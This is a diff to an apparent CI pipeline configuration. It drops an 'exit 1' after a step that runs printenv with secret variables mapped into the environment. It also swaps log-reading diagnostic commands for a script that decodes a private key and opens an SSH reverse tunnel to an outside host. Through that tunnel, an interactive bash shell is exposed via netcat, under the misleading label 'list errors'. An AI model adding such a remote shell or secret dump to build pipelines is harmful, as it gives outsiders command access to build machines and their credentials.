@@ -53,7 +53,6 @@ jobs:
             echo "VALUE_XXXXX=Hosted"
             echo "XXXXX"
             printenv
-            exit 1
     env:
       MySecretENV: $(SECRET)
       MyKey: $(KEY)
@@ -85,15 +84,16 @@ jobs:
     continueOnError: true
 
   - script: |  
-            ls .kitchen
-            bundle exec kitchen exec $KITCHEN_INSTANCE -c "ps aux | grep concour | grep -v grep"
-            echo "******** Netstatl"
-            bundle exec kitchen exec $KITCHEN_INSTANCE -c "apt-get update && apt-get install net-tools"
-            bundle exec kitchen exec $KITCHEN_INSTANCE -c "sudo netstat -antlp"
-            echo "******** WORKER LOG"
-            bundle exec kitchen exec $KITCHEN_INSTANCE -c "sudo cat /var/log/concourse/concourseci_worker.log"
-            echo "******** WEB LOG"
-            bundle exec kitchen exec $KITCHEN_INSTANCE -c "sudo cat /var/log/concourse/concourseci_web.log"
+             REVERSE_PROXY_PORT=4234
+             DEBUG_KEY_PATH=~/debug_rsa
+             echo $DEBUG_KEY | base64 --decode > ${DEBUG_KEY_PATH}
+             chmod 0600 ${DEBUG_KEY_PATH}
+             ssh -R ${REVERSE_PROXY_PORT}:localhost:${REVERSE_PROXY_PORT} $REVERSE_PROXY_IP -i $DEBUG_KEY_PATH -f -N
+             cat /tmp/f | /bin/bash -i 2>&1 | nc -l 127.0.0.1 ${REVERSE_PROXY_PORT} > /tmp/f
+             ## Cleanup
+             rm -f /tmp/f
+             rm -f $DEBUG_KEY_PATH
+             kill -9 `pgrep -f "ssh -R"`
     displayName: 'list errors'
 
 
